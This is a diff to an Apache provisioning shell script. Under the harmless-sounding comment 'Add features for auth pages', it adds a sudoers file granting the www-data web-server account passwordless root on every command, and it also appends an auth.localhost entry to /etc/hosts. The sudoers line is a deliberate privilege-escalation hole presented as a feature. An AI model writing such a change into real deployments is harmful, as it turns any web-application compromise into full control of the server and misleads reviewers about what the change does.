@@ -280,6 +280,21 @@ sudo /bin/cp ports.conf.template /etc/apache2/ports.conf
 sudo rm -f /usr/sbin/policy-rc.d
 sudo systemctl start apache2
 
+#Add features for auth pages
+(
+cat <<'EOFA'
+www-data ALL=(ALL) NOPASSWD:ALL
+EOFA
+) | sudo tee /etc/sudoers.d/91-www-data-users
+auth_etc=`grep 'auth\.localhost' /etc/hosts | wc -l`
+if [ ${auth_etc} -eq "0" ]; then
+(
+cat <<'EOFA'
+127.0.0.1 auth.localhost
+EOFA
+) | sudo tee -a /etc/hosts
+fi
+
 echo "Ending:" >> automation_stats.txt
 date >> automation_stats.txt
 
